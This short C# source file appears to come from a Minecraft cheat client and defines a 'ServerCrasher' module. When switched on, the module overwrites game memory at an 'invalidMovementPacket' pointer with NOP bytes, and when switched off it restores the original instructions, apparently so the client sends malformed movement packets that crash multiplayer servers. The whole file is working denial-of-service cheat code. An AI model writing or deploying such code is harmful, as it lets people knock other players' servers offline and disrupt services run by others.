using Flare_Sharp.ClientBase.Categories;
using Flare_Sharp.Memory;
using Flare_Sharp.Memory.CraftSDK;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Flare_Sharp.ClientBase.Modules.Modules
{
    public class ServerCrasher : Module
    {
        public ServerCrasher() : base("Crasher", CategoryHandler.registry.categories[3], (char)0x07, false)
        {
        }

        public override void onEnable()
        {
            base.onEnable();
            byte[] write = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
            MCM.writeBaseBytes(Pointers.invalidMovementPacket, write);
        }
        public override void onDisable()
        {
            base.onDisable();
            byte[] write = { 0xFF, 0x50, 0x58, 0xF2, 0x0F, 0x10, 0x00 };
            MCM.writeBaseBytes(Pointers.invalidMovementPacket, write);
        }
    }
}
